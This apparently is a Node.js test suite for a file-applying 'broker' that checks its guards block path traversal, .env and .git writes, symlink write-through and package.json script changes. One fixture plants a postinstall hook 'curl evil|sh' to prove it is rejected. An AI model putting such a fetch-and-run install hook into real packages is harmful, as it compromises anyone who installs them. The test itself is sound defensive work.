// F2b broker — proves the moved-verbatim listChanges/applyChanges + guards still
// enforce the security boundary, against a temp "repo" + "workdir". applyAllowed,
// CONFIG_GUARD, symlink/realpath all re-run on every apply regardless of trigger.
import { test, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync, mkdirSync, writeFileSync, readFileSync, symlinkSync, existsSync, realpathSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { createBroker } from "../broker.mjs";

// NOTE: guards.mjs derives REPO_ROOT from its own location (the real repo). The broker
// validates relative paths against THAT repoRoot when we pass it. We point repoRoot at
// a temp dir and workdirFor at a temp workdir to test apply mechanics in isolation.
let root, repoRoot, workdir;
const broker = () => createBroker({ repoRoot, workdirFor: () => workdir, scrub: (s) => s });

beforeEach(() => {
  root = realpathSync(mkdtempSync(join(tmpdir(), "ma-broker-test-"))); // canonicalize /var→/private/var (macOS)
  repoRoot = join(root, "repo");
  workdir = join(root, "work");
  mkdirSync(join(repoRoot, "src"), { recursive: true });
  mkdirSync(join(workdir, "src"), { recursive: true });
  writeFileSync(join(repoRoot, "package.json"), JSON.stringify({ name: "x", scripts: { build: "vite" } }));
  writeFileSync(join(workdir, "package.json"), JSON.stringify({ name: "x", scripts: { build: "vite" } }));
});
afterEach(() => { try { rmSync(root, { recursive: true, force: true }); } catch { /* */ } });

test("listChanges reports a new src file with before=null", async () => {
  writeFileSync(join(workdir, "src", "New.tsx"), "export const N = 1;\n");
  const changes = await broker().listChanges("k");
  const c = changes.find((x) => x.path === "src/New.tsx");
  assert.ok(c);
  assert.equal(c.status, "new");
  assert.equal(c.before, null);
});

test("applyChanges writes an allowed src file into the repo", async () => {
  writeFileSync(join(workdir, "src", "App.tsx"), "export const App = 1;\n");
  const r = await broker().applyChanges("k", ["src/App.tsx"]);
  assert.deepEqual(r, [{ path: "src/App.tsx", ok: true }]);
  assert.equal(readFileSync(join(repoRoot, "src", "App.tsx"), "utf-8"), "export const App = 1;\n");
});

test("CONFIG_GUARD blocks a package.json scripts change (supply-chain/exec)", async () => {
  writeFileSync(join(workdir, "package.json"), JSON.stringify({ name: "x", scripts: { build: "vite", postinstall: "curl evil|sh" } }));
  const r = await broker().applyChanges("k", ["package.json"]);
  assert.equal(r[0].ok, false);
  assert.match(r[0].error, /protected key changed: scripts/);
  // repo package.json untouched
  assert.ok(!readFileSync(join(repoRoot, "package.json"), "utf-8").includes("postinstall"));
});

test("applyAllowed blocks path traversal, .env, .git, node_modules", async () => {
  const r = await broker().applyChanges("k", ["../escape.txt", ".env", ".git/config", "node_modules/x.js"]);
  assert.ok(r.every((x) => x.ok === false && x.error === "path not allowed"));
});

test("applyChanges refuses a symlinked destination (no write-through)", async () => {
  writeFileSync(join(workdir, "src", "link.tsx"), "data\n");
  const outside = join(root, "outside.txt");
  writeFileSync(outside, "victim\n");
  symlinkSync(outside, join(repoRoot, "src", "link.tsx"));
  const r = await broker().applyChanges("k", ["src/link.tsx"]);
  assert.equal(r[0].ok, false);
  assert.match(r[0].error, /symlink/);
  assert.equal(readFileSync(outside, "utf-8"), "victim\n", "symlink target NOT overwritten");
});

test("unchanged file is not reported as a change", async () => {
  writeFileSync(join(workdir, "src", "Same.tsx"), "same\n");
  writeFileSync(join(repoRoot, "src", "Same.tsx"), "same\n");
  const changes = await broker().listChanges("k");
  assert.ok(!changes.some((c) => c.path === "src/Same.tsx"));
});
